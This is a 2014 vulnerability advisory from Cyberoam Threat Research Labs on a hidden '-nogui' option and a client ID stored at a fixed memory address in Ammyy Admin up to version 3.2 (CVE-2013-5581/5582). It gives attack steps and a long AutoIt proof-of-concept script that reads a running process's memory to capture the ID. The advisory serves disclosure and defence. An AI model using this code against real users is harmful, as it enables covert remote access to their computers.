@@ -1,0 +1,510 @@
+Title:
+====
+Ammyy Admin - Hidden hard-coded option and Access Control vulnerability.
+
+Credit:
+======
+Name: Bhadresh Patel
+Company/affiliation: Cyberoam Technologies Private Limited
+Website: www.cyberoam.com
+
+CVE:
+====
+- CVE-2013-5581 for hidden hard-coded option (CWE-255).
+- CVE-2013-5582 for failure to enforce access restrictions for resources (CWE-264).
+
+Date:
+====
+17-01-2014
+
+
+CL-ID: 
+====
+CRD-2013-04 
+
+Vendor:
+======
+Ammyy is in to developing cutting edge internet solutions. They have researched informational technologies and automation management of remote computer access services for many years. The result of their efforts is new Remote Access system "Ammyy Admin".
+
+Product:
+=======
+Ammyy Admin is the easiest way to establish remote desktop connection. You can easily share a remote desktop or control a server over the Internet with Ammyy Admin. 
+No matter where you are, Ammyy Admin makes it safe and easy to quickly access a remote desktop within a few seconds.
+Ammyy Admin is trusted by more than 21 000 000 personal and corporate users.
+Product link: http://www.ammyy.com/en/downloads.html 
+
+Abstract:
+======= 
+Cyberoam Threat Research Labs discovered Hidden option and Access Control vulnerability in Ammyy Admin tool.
+
+
+Report-Timeline (DD-MM-YYYY):
+====================
+12-08-2013: Vendor notification
+13-08-2013: Vendor Response/Feedback
+13-12-2013: Vendor Fix/Patch
+17-01-2014: Public or Non-Public Disclosure 
+
+Affected Version:
+=============
+Version (<=3.2)
+
+Exploitation-Technique:
+===================
+Local
+
+Severity Rating:
+===================
+CVSS Base Score 7.2 (AV:N/AC:M/Au:N/C:N/I:N/A:P)
+
+Details:
+=======
+There is a Hidden option and Access Control vulnerability in Ammyy Admin tool which allows an attacker to utilize "Ammyy Admin tool" as a trojan horse to access computer without victim's information.
+An approach to have hidden option "-nogui" along with storing "client ID" at fixed memory location could be exploited by an attacker to use "Ammyy Admin" as a trojan horse.
+
+Proof Of Concept:
+================
+An attacker could exploit above vulnerabilities using following steps,
+
+1) Create custom settings.rdp and settings3.bin to allow access to any "computer ID" with predefined password.
+2) Use hidden option "-nogui" to run "Ammyy Amin" without the user information.
+2) Acquire the client id by reading memory location "004A3658".
+3) Send client id to attackers C&C server.
+
+-------- Logs -------
+
+###### Hidden hard-coded option (CVE-2013-5581) ######
+
+root@bhdresh:~# strings AA_v3.2.exe | grep -i ^"-"
+-f=*
+- 5H
+-connect
+-set_proxy_
+-dosas_
+-elevated
+-log
+-lunch
+-nogui
+-service
+-debug
+-remove
+-install
+-outid
+-setsettings
+-rstid
+-showversion
+-notstartclient
+-startclient
+-minimize
+-+/3
+
+
+#### client ID at Fixed memory location (CVE-2013-5582) ####
+
+=======PoC screenshot=======
+
+http://oi42.tinypic.com/34owtoy.jpg
+
+
+=======PoC autoit code to hijack client ID=======
+
+Func _memoryopen($iv_pid, $iv_desiredaccess = 2035711, $iv_inherithandle = 1)
+  If NOT ProcessExists($iv_pid) Then
+    SetError(1)
+    Return 0
+  EndIf
+  Local $ah_handle[2] = [DllOpen("kernel32.dll")]
+  If @error Then
+    SetError(2)
+    Return 0
+  EndIf
+  Local $av_openprocess = DllCall($ah_handle[0], "int", "OpenProcess", "int", $iv_desiredaccess, "int", $iv_inherithandle, "int", $iv_pid)
+  If @error Then
+    DllClose($ah_handle[0])
+    SetError(3)
+    Return 0
+  EndIf
+  $ah_handle[1] = $av_openprocess[0]
+  Return $ah_handle
+EndFunc
+
+Func _memoryread($iv_address, $ah_handle, $sv_type = "dword")
+  If NOT IsArray($ah_handle) Then
+    SetError(1)
+    Return 0
+  EndIf
+  Local $v_buffer = DllStructCreate($sv_type)
+  If @error Then
+    SetError(@error + 1)
+    Return 0
+  EndIf
+  DllCall($ah_handle[0], "int", "ReadProcessMemory", "int", $ah_handle[1], "int", $iv_address, "ptr", DllStructGetPtr($v_buffer), "int", DllStructGetSize($v_buffer), "int", "")
+  If NOT @error Then
+    Local $v_value = DllStructGetData($v_buffer, 1)
+    Return $v_value
+  Else
+    SetError(6)
+    Return 0
+  EndIf
+EndFunc
+
+Func _memorywrite($iv_address, $ah_handle, $v_data, $sv_type = "dword")
+  If NOT IsArray($ah_handle) Then
+    SetError(1)
+    Return 0
+  EndIf
+  Local $v_buffer = DllStructCreate($sv_type)
+  If @error Then
+    SetError(@error + 1)
+    Return 0
+  Else
+    DllStructSetData($v_buffer, 1, $v_data)
+    If @error Then
+      SetError(6)
+      Return 0
+    EndIf
+  EndIf
+  DllCall($ah_handle[0], "int", "WriteProcessMemory", "int", $ah_handle[1], "int", $iv_address, "ptr", DllStructGetPtr($v_buffer), "int", DllStructGetSize($v_buffer), "int", "")
+  If NOT @error Then
+    Return 1
+  Else
+    SetError(7)
+    Return 0
+  EndIf
+EndFunc
+
+Func _memoryclose($ah_handle)
+  If NOT IsArray($ah_handle) Then
+    SetError(1)
+    Return 0
+  EndIf
+  DllCall($ah_handle[0], "int", "CloseHandle", "int", $ah_handle[1])
+  If NOT @error Then
+    DllClose($ah_handle[0])
+    Return 1
+  Else
+    DllClose($ah_handle[0])
+    SetError(2)
+    Return 0
+  EndIf
+EndFunc
+
+Func setprivilege($privilege, $benable)
+  Const $token_adjust_privileges = 32
+  Const $token_query = 8
+  Const $se_privilege_enabled = 2
+  Local $htoken, $sp_auxret, $sp_ret, $hcurrprocess, $ntokens, $ntokenindex, $priv
+  $ntokens = 1
+  $luid = DllStructCreate("dword;int")
+  If IsArray($privilege) Then $ntokens = UBound($privilege)
+  $token_privileges = DllStructCreate("dword;dword[" & (3 * $ntokens) & "]")
+  $newtoken_privileges = DllStructCreate("dword;dword[" & (3 * $ntokens) & "]")
+  $hcurrprocess = DllCall("kernel32.dll", "hwnd", "GetCurrentProcess")
+  $sp_auxret = DllCall("advapi32.dll", "int", "OpenProcessToken", "hwnd", $hcurrprocess[0], "int", BitOR($token_adjust_privileges, $token_query), "int*", 0)
+  If $sp_auxret[0] Then
+    $htoken = $sp_auxret[3]
+    DllStructSetData($token_privileges, 1, 1)
+    $ntokenindex = 1
+    While $ntokenindex <= $ntokens
+      If IsArray($privilege) Then
+        $priv = $privilege[$ntokenindex - 1]
+      Else
+        $priv = $privilege
+      EndIf
+      $ret = DllCall("advapi32.dll", "int", "LookupPrivilegeValue", "str", "", "str", $priv, "ptr", DllStructGetPtr($luid))
+      If $ret[0] Then
+        If $benable Then
+          DllStructSetData($token_privileges, 2, $se_privilege_enabled, (3 * $ntokenindex))
+        Else
+          DllStructSetData($token_privileges, 2, 0, (3 * $ntokenindex))
+        EndIf
+        DllStructSetData($token_privileges, 2, DllStructGetData($luid, 1), (3 * ($ntokenindex - 1)) + 1)
+        DllStructSetData($token_privileges, 2, DllStructGetData($luid, 2), (3 * ($ntokenindex - 1)) + 2)
+        DllStructSetData($luid, 1, 0)
+        DllStructSetData($luid, 2, 0)
+      EndIf
+      $ntokenindex += 1
+    WEnd
+    $ret = DllCall("advapi32.dll", "int", "AdjustTokenPrivileges", "hwnd", $htoken, "int", 0, "ptr", DllStructGetPtr($token_privileges), "int", DllStructGetSize($newtoken_privileges), "ptr", DllStructGetPtr($newtoken_privileges), "int*", 0)
+    $f = DllCall("kernel32.dll", "int", "GetLastError")
+  EndIf
+  $newtoken_privileges = 0
+  $token_privileges = 0
+  $luid = 0
+  If $sp_auxret[0] = 0 Then Return 0
+  $sp_auxret = DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $htoken)
+  If NOT $ret[0] AND NOT $sp_auxret[0] Then Return 0
+  Return $ret[0]
+EndFunc
+
+Func _memorypointerread($iv_address, $ah_handle, $av_offset, $sv_type = "dword")
+  If IsArray($av_offset) Then
+    If IsArray($ah_handle) Then
+      Local $iv_pointercount = UBound($av_offset) - 1
+    Else
+      SetError(2)
+      Return 0
+    EndIf
+  Else
+    SetError(1)
+    Return 0
+  EndIf
+  Local $iv_data[2], $i
+  Local $v_buffer = DllStructCreate("dword")
+  For $i = 0 To $iv_pointercount
+    If $i = $iv_pointercount Then
+      $v_buffer = DllStructCreate($sv_type)
+      If @error Then
+        SetError(@error + 2)
+        Return 0
+      EndIf
+      $iv_address = "0x" & Hex($iv_data[1] + $av_offset[$i])
+      DllCall($ah_handle[0], "int", "ReadProcessMemory", "int", $ah_handle[1], "int", $iv_address, "ptr", DllStructGetPtr($v_buffer), "int", DllStructGetSize($v_buffer), "int", "")
+      If @error Then
+        SetError(7)
+        Return 0
+      EndIf
+      $iv_data[1] = DllStructGetData($v_buffer, 1)
+    ElseIf $i = 0 Then
+      DllCall($ah_handle[0], "int", "ReadProcessMemory", "int", $ah_handle[1], "int", $iv_address, "ptr", DllStructGetPtr($v_buffer), "int", DllStructGetSize($v_buffer), "int", "")
+      If @error Then
+        SetError(7)
+        Return 0
+      EndIf
+      $iv_data[1] = DllStructGetData($v_buffer, 1)
+    Else
+      $iv_address = "0x" & Hex($iv_data[1] + $av_offset[$i])
+      DllCall($ah_handle[0], "int", "ReadProcessMemory", "int", $ah_handle[1], "int", $iv_address, "ptr", DllStructGetPtr($v_buffer), "int", DllStructGetSize($v_buffer), "int", "")
+      If @error Then
+        SetError(7)
+        Return 0
+      EndIf
+      $iv_data[1] = DllStructGetData($v_buffer, 1)
+    EndIf
+  Next
+  $iv_data[0] = $iv_address
+  Return $iv_data
+EndFunc
+
+Func _memorypointerwrite($iv_address, $ah_handle, $av_offset, $v_data, $sv_type = "dword")
+  If IsArray($av_offset) Then
+    If IsArray($ah_handle) Then
+      Local $iv_pointercount = UBound($av_offset) - 1
+    Else
+      SetError(2)
+      Return 0
+    EndIf
+  Else
+    SetError(1)
+    Return 0
+  EndIf
+  Local $iv_structdata, $i
+  Local $v_buffer = DllStructCreate("dword")
+  For $i = 0 To $iv_pointercount
+    If $i = $iv_pointercount Then
+      $v_buffer = DllStructCreate($sv_type)
+      If @error Then
+        SetError(@error + 3)
+        Return 0
+      EndIf
+      DllStructSetData($v_buffer, 1, $v_data)
+      If @error Then
+        SetError(8)
+        Return 0
+      EndIf
+      $iv_address = "0x" & Hex($iv_structdata + $av_offset[$i])
+      DllCall($ah_handle[0], "int", "WriteProcessMemory", "int", $ah_handle[1], "int", $iv_address, "ptr", DllStructGetPtr($v_buffer), "int", DllStructGetSize($v_buffer), "int", "")
+      If @error Then
+        SetError(9)
+        Return 0
+      Else
+        Return $iv_address
+      EndIf
+    ElseIf $i = 0 Then
+      DllCall($ah_handle[0], "int", "ReadProcessMemory", "int", $ah_handle[1], "int", $iv_address, "ptr", DllStructGetPtr($v_buffer), "int", DllStructGetSize($v_buffer), "int", "")
+      If @error Then
+        SetError(3)
+        Return 0
+      EndIf
+      $iv_structdata = DllStructGetData($v_buffer, 1)
+    Else
+      $iv_address = "0x" & Hex($iv_structdata + $av_offset[$i])
+      DllCall($ah_handle[0], "int", "ReadProcessMemory", "int", $ah_handle[1], "int", $iv_address, "ptr", DllStructGetPtr($v_buffer), "int", DllStructGetSize($v_buffer), "int", "")
+      If @error Then
+        SetError(3)
+        Return 0
+      EndIf
+      $iv_structdata = DllStructGetData($v_buffer, 1)
+    EndIf
+  Next
+EndFunc
+
+Func _memorygetbaseaddress($ah_handle, $ihexdec = 0)
+  Local $iv_address = 1048576
+  Local $v_buffer = DllStructCreate("dword;dword;dword;dword;dword;dword;dword")
+  Local $vdata
+  Local $vtype
+  If NOT IsArray($ah_handle) Then
+    SetError(1)
+    Return 0
+  EndIf
+  DllCall($ah_handle[0], "int", "VirtualQueryEx", "int", $ah_handle[1], "int", $iv_address, "ptr", DllStructGetPtr($v_buffer), "int", DllStructGetSize($v_buffer))
+  If NOT @error Then
+    $vdata = Hex(DllStructGetData($v_buffer, 2))
+    $vtype = Hex(DllStructGetData($v_buffer, 3))
+    While $vtype <> "00000080"
+      DllCall($ah_handle[0], "int", "VirtualQueryEx", "int", $ah_handle[1], "int", $iv_address, "ptr", DllStructGetPtr($v_buffer), "int", DllStructGetSize($v_buffer))
+      $vdata = Hex(DllStructGetData($v_buffer, 2))
+      $vtype = Hex(DllStructGetData($v_buffer, 3))
+      If Hex($iv_address) = "01000000" Then ExitLoop 
+      $iv_address += 65536
+    WEnd
+    If $vtype = "00000080" Then
+      SetError(0)
+      If $ihexdec = 1 Then
+        Return Dec($vdata)
+      Else
+        Return $vdata
+      EndIf
+    Else
+      SetError(2)
+      Return 0
+    EndIf
+  Else
+    SetError(3)
+    Return 0
+  EndIf
+EndFunc
+
+Func _memorymodulegetbaseaddress($ipid, $smodule)
+  If NOT ProcessExists($ipid) Then Return SetError(1, 0, 0)
+  If NOT IsString($smodule) Then Return SetError(2, 0, 0)
+  Local $psapi = DllOpen("psapi.dll")
+  Local $hprocess
+  Local $permission = BitOR(2, 1024, 8, 16, 32)
+  If $ipid > 0 Then
+    Local $hprocess = DllCall("kernel32.dll", "ptr", "OpenProcess", "dword", $permission, "int", 0, "dword", $ipid)
+    If $hprocess[0] Then
+      $hprocess = $hprocess[0]
+    EndIf
+  EndIf
+  Local $modules = DllStructCreate("ptr[1024]")
+  Local $acall = DllCall($psapi, "int", "EnumProcessModules", "ptr", $hprocess, "ptr", DllStructGetPtr($modules), "dword", DllStructGetSize($modules), "dword*", 0)
+  If $acall[4] > 0 Then
+    Local $imodnum = $acall[4] / 4
+    Local $atemp
+    For $i = 1 To $imodnum
+      $atemp = DllCall($psapi, "dword", "GetModuleBaseNameW", "ptr", $hprocess, "ptr", Ptr(DllStructGetData($modules, 1, $i)), "wstr", "", "dword", 260)
+      If $atemp[3] = $smodule Then
+        DllClose($psapi)
+        Return Ptr(DllStructGetData($modules, 1, $i))
+      EndIf
+    Next
+  EndIf
+  DllClose($psapi)
+  Return SetError(-1, 0, 0)
+EndFunc
+
+#EndRegion
+
+Func _memreaddll($dll, $offset, $ah_handle, $sv_type = "dword")
+  $staticoffset = Dec($offset)
+  $baseaddr = _memorymodulegetbaseaddress($ah_handle, $dll)
+  $finaladdr = "0x" & Hex($baseaddr + $staticoffset)
+  $memtest = _memoryread($finaladdr, $ah_handle, $sv_type)
+  Return $memtest
+EndFunc
+
+Func _memwritedll($dll, $offset, $value, $ah_handle, $sv_type = "dword")
+  $staticoffset = Dec($offset)
+  $baseaddr = _memorymodulegetbaseaddress($ah_handle, $dll)
+  $finaladdr = "0x" & Hex($baseaddr + $staticoffset)
+  $memtest = _memorywrite($finaladdr, $ah_handle, $value, $sv_type)
+  Return $memtest
+EndFunc
+
+Func _memwritedllbytearray($dll, $offset, $ah_handle, $v_array)
+  Local $staticoffset = Dec($offset)
+  Local $baseaddr = _memorymodulegetbaseaddress($ah_handle, $dll)
+  Local $finaladdr = "0x" & Hex($baseaddr + $staticoffset)
+  Local $memtest = _memorywritebytearray($finaladdr, $ah_handle, $v_array)
+  Return $memtest
+EndFunc
+
+Func _memorywritebytearray($iv_address, $ah_handle, $v_array)
+  If NOT IsArray($ah_handle) Then
+    SetError(1)
+    Return 0
+  EndIf
+  If NOT IsArray($v_array) Then
+    Return 0
+  EndIf
+  Local $emax = UBound($v_array)
+  Local $bytestring = ""
+  For $i = 0 To $emax - 1
+    $bytestring = $bytestring & "byte;"
+  Next
+  Local $v_buffer = DllStructCreate($bytestring)
+  If @error Then
+    Return 0
+  Else
+    For $i = 1 To $emax
+      DllStructSetData($v_buffer, $i, $v_array[$i - 1])
+      If @error Then
+        Return 0
+      EndIf
+    Next
+  EndIf
+  DllCall($ah_handle[0], "int", "WriteProcessMemory", "int", $ah_handle[1], "int", $iv_address, "ptr", DllStructGetPtr($v_buffer), "int", DllStructGetSize($v_buffer), "int", "")
+  If NOT @error Then
+    Return 1
+  Else
+    SetError(7)
+    Return 0
+  EndIf
+EndFunc
+
+FileChangeDir(@TempDir)
+FileDelete("id")
+$id = ProcessExists("AAv3.exe")
+Local $file = FileOpen("id", 1)
+$memoryopen = _memoryopen($id)
+While 1
+  $mem_read1 = _memoryread("0x" & "004A3658", $memoryopen)
+  If NOT $mem_read1 = "" Then
+    MsgBox(0, "Cyberoam Threat Research Labs", $mem_read1)
+    FileWrite($file, $mem_read1)
+    ExitLoop 
+  EndIf
+  Sleep(100)
+WEnd
+_memoryclose($memoryopen)
+
+==========================================
+-------------------------- 
+
+Caveats / Prerequisites:
+======================
+The attacker needs to entice victims to perform an action in order to exploit this vulnerability.
+
+
+Risk:
+=====
+
+The security risk of Hidden option and Access Control vulnerability is estimated as High.
+
+Credits:
+=======
+Cyberoam Threat Research Labs - Bhadresh Patel
+
+Disclaimer:
+===========
+The information provided in this advisory is provided as it is without any warranty. Any modified copy or reproduction, including partially usages, of this file requires authorization from Cyberoam Threat Research Labs. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by Cyberoam Threat Research Labs.
+
+The first attempt at contact will be through any appropriate contacts or formal mechanisms listed on the vendor Web site, or by sending an e-mail with the pertinent information about the vulnerability. Simultaneous with the vendor being notified, Cyberoam may distribute vulnerability protection filters to its customers' IPS devices through the IPS upgrades. 
+If a vendor fails to respond after five business days, Cyberoam Threat Research Labs may issue a public advisory disclosing its findings fifteen business days after the initial contact.
+
+If a vendor response is received within the timeframe outlined above, Cyberoam Threat Research Labs will allow the vendor 6-months to address the vulnerability with a patch. At the end of the deadline if a vendor is not responsive or unable to provide a reasonable statement as to why the vulnerability is not fixed, the Cyberoam Threat Research Labs will publish a limited advisory to enable the defensive community to protect the user. We believe that by doing so the vendor will understand the responsibility they have to their customers and will react appropriately.
+Cyberoam Threat Research Labs will make every effort to work with vendors to ensure they understand the technical details and severity of a reported security flaw. If a product vendor is unable to, or chooses not to, patch a particular security flaw, Cyberoam Threat Research Labs will offer to work with that vendor to publicly disclose the flaw with some effective workarounds.
+Before public disclosure of a vulnerability, Cyberoam Threat Research Labs may share technical details of the vulnerability with other security vendors who are in a position to provide a protective response to a broader user base.
+-------------------------------------------------------------------------------------------------------
